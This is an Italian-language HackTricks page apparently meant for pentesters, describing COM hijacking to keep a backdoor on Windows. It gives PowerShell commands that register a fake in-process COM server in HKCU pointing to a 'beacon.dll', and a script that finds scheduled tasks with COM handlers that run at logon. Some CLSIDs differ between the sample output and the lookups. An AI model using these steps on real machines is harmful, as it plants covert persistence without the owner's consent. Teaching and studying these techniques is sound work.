# COM Hijacking

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **su GitHub.**

</details>

### Ricerca di componenti COM inesistenti

Poiché i valori di HKCU possono essere modificati dagli utenti, **COM Hijacking** potrebbe essere utilizzato come meccanismo **persistente**. Utilizzando `procmon` è facile trovare registri COM cercati che non esistono e che un attaccante potrebbe creare per persistere. Filtri:

* Operazioni **RegOpenKey**.
* dove il _Risultato_ è **NOME NON TROVATO**.
* e il _Percorso_ termina con **InprocServer32**.

Una volta deciso quale COM inesistente impersonare, esegui i seguenti comandi. _Fai attenzione se decidi di impersonare una COM che viene caricata ogni pochi secondi, potrebbe essere eccessivo._&#x20;
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componenti COM del Task Scheduler suscettibili di hijacking

I Task di Windows utilizzano Trigger personalizzati per chiamare oggetti COM e poiché vengono eseguiti tramite il Task Scheduler, è più facile prevedere quando verranno attivati.

```powershell
# Mostra gli ID delle classi COM
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
    if ($Task.Actions.ClassId -ne $null)
    {
        if ($Task.Triggers.Enabled -eq $true)
        {
            $usersSid = "S-1-5-32-545"
            $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

            if ($Task.Principal.GroupId -eq $usersGroup)
            {
                Write-Host "Nome Task: " $Task.TaskName
                Write-Host "Percorso Task: " $Task.TaskPath
                Write-Host "CLSID: " $Task.Actions.ClassId
                Write-Host
            }
        }
    }
}

# Esempio di output:
<strong># Nome Task:  Esempio
</strong># Percorso Task:  \Microsoft\Windows\Esempio\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [altre righe simili...]</code></pre>

Controllando l'output, puoi selezionare uno che verrà eseguito **ogni volta che un utente effettua l'accesso**, ad esempio.

Ora cercando il CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** e in HKLM e HKCU, di solito scoprirai che il valore non esiste in HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Quindi, puoi semplicemente creare l'entry HKCU e ogni volta che l'utente effettua il login, il tuo backdoor verrà attivato.

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository GitHub di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
